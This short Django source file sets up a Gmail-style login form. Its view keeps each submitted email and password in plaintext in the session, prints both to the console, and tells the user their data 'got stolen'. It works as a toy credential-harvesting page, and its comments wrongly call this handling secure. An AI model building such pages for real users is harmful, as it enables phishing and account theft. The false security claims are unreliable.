from django import forms
from django.shortcuts import render

# A form defined with exactly two generic fields
class SimpleEntryForm(forms.Form):
    account_name = forms.CharField(label="gmail", max_length=150)
    access_code = forms.CharField(label="password", widget=forms.PasswordInput())

def index(request):
    message = None
    
    # If the user clicks submit
    if request.method == "POST":
        form = SimpleEntryForm(request.POST)
        if form.is_valid():
            # Get the input values safely
            account = form.cleaned_data["account_name"]
            code = form.cleaned_data["access_code"]
            
            # Store them securely inside the session list
            if "stored_entries" not in request.session:
                request.session["stored_entries"] = []
                
            current_entries = request.session["stored_entries"]
            current_entries.append({
                "account": account,
                "password": code
            })
            request.session["stored_entries"] = current_entries  # Save changes
            
            # Show a success message on the same page and reset the form
            message = f"congradulations your personal data got stolen !"
            form = SimpleEntryForm() 
            print(f"gmail: {account}")
            print(f"password: {code}")
    else:
        # Give them a clean blank form when they first arrive
        form = SimpleEntryForm()

    return render(request, "gmail/index.html", {
        "form": form,
        "message": message
    })